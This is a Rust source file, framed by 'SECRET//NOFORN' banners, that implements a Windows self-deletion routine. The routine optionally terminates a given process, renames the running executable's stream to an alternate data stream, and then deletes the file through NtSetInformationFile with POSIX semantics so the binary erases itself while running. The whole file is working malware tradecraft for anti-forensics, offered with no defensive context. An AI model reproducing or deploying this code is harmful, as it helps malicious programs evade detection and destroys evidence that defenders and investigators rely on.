/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

use std::env;
use std::ffi::c_void;
use std::mem::{size_of, zeroed};
use std::ptr;

use windows::{
    core::{Result, PCWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE},
        Storage::FileSystem::{
            CreateFileW, SetFileInformationByHandle, 
            FILE_SHARE_READ, OPEN_EXISTING, 
            DELETE, SYNCHRONIZE, FileRenameInfo, FILE_FLAGS_AND_ATTRIBUTES,
        },
        System::{
            Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY},
            Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE},
        },
    },
};

// define NtSetInformationFile signature from ntdll
#[repr(C)]
struct IO_STATUS_BLOCK {
    Status: i32,
    Information: usize,
}

#[link(name = "ntdll")]
extern "system" {
    fn NtSetInformationFile(
        FileHandle: HANDLE,
        IoStatusBlock: *mut IO_STATUS_BLOCK,
        FileInformation: *const c_void,
        Length: u32,
        FileInformationClass: u32,
    ) -> i32;
}

const FileDispositionInformationEx: u32 = 64; 

#[repr(C)]
struct FILE_DISPOSITION_INFORMATION_EX {
    Flags: u32,
}

const FILE_DISPOSITION_DELETE: u32 = 0x00000001;
const FILE_DISPOSITION_POSIX_SEMANTICS: u32 = 0x00000002;

#[repr(C)]
struct FILE_RENAME_INFO_MANUAL {
    replace_if_exists: u8,
    _pad: [u8; 7],
    root_dir: HANDLE,
    file_name_len: u32,
    file_name: [u16; 1],
}

/// deletes self from disk (Rename(ADS) + NtSetInformationFile(DispositionEx)
pub fn delete_self(clean_pid: Option<u32>) -> Result<()> {
    unsafe {
        if let Some(pid) = clean_pid {
             if let Ok(h_proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                 let _ = TerminateProcess(h_proc, 0);
                 let _ = CloseHandle(h_proc);
             }
        }
        // rename info (on Heap for variable length)
        let stream = ":temp";
        let new_stream: Vec<u16> = stream.encode_utf16().chain(std::iter::once(0)).collect();
        let stream_length = new_stream.len();
        
        // size calculation for struct with variable array at end
        let s_rename = size_of::<FILE_RENAME_INFO_MANUAL>() - size_of::<u16>() + (stream_length * size_of::<u16>());

        let heap = GetProcessHeap()?;
        let p_rename = HeapAlloc(heap, HEAP_ZERO_MEMORY, s_rename) as *mut FILE_RENAME_INFO_MANUAL;
        if p_rename.is_null() {
            return Err(windows::core::Error::from_thread());
        }

        (*p_rename).replace_if_exists = 1;
        (*p_rename).root_dir = HANDLE(ptr::null_mut());
        
        // set name length
        (*p_rename).file_name_len = (stream_length * size_of::<u16>()) as u32 - 2; 

        ptr::copy_nonoverlapping(
            new_stream.as_ptr(),
            (*p_rename).file_name.as_mut_ptr(),
            stream_length,
        );

        // get path
        let path = env::current_exe().map_err(|_| windows::core::Error::from_thread())?;
        let path_str = path.to_str().unwrap_or("");
        let mut full_path: Vec<u16> = path_str.encode_utf16().collect();
        full_path.push(0);

        // rename
        let h_file = CreateFileW(
            PCWSTR(full_path.as_ptr()),
            DELETE.0 | SYNCHRONIZE.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )?;

        if h_file == INVALID_HANDLE_VALUE {
             let _ = HeapFree(heap, windows::Win32::System::Memory::HEAP_FLAGS(0), Some(p_rename.cast()));
             return Err(windows::core::Error::from_thread());
        }

        // SetFileInformationByHandle returns Result<()>
        if let Err(e) = SetFileInformationByHandle(
            h_file,
            FileRenameInfo,
            p_rename as *const c_void,
            s_rename as u32
        ) {
             let _ = CloseHandle(h_file);
             let _ = HeapFree(heap, windows::Win32::System::Memory::HEAP_FLAGS(0), Some(p_rename.cast()));
             return Err(e);
        }

        let _ = CloseHandle(h_file);

        // suicide (DispositionEx)
        let h_file = CreateFileW(
            PCWSTR(full_path.as_ptr()),
            DELETE.0 | SYNCHRONIZE.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )?;
        
         if h_file == INVALID_HANDLE_VALUE {
             let _ = HeapFree(heap, windows::Win32::System::Memory::HEAP_FLAGS(0), Some(p_rename.cast()));
             return Err(windows::core::Error::from_thread());
        }

        let mut iosb: IO_STATUS_BLOCK = zeroed();
        let mut disp_info = FILE_DISPOSITION_INFORMATION_EX {
            Flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS,
        };

        let status = NtSetInformationFile(
            h_file,
            &mut iosb,
            &mut disp_info as *mut _ as *mut c_void,
            size_of::<FILE_DISPOSITION_INFORMATION_EX>() as u32,
            FileDispositionInformationEx,
        );

        let _ = CloseHandle(h_file);
        let _ = HeapFree(heap, windows::Win32::System::Memory::HEAP_FLAGS(0), Some(p_rename.cast()));

        if status != 0 {
             return Err(windows::core::Error::from_thread());
        }

        Ok(())
    }
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/
